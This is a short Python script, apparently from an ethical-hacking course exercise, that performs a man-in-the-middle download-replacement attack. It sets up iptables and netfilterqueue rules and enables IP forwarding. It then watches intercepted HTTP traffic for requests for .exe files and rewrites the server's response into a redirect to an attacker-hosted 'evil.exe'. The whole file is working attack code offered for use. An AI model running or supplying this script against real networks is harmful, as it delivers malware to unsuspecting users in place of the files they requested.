#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.4" not in scapy_packet[scapy.Raw].load:
                print "Exe Request"
                ack_list.append(scapy_packet[scapy.TCP].ack)
             

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print 'Replacing files'
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.4/evil-files/evil.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

subprocess.call("service apache2 start",shell=True)
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
subprocess.call("iptables --flush",shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000",shell=True)
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()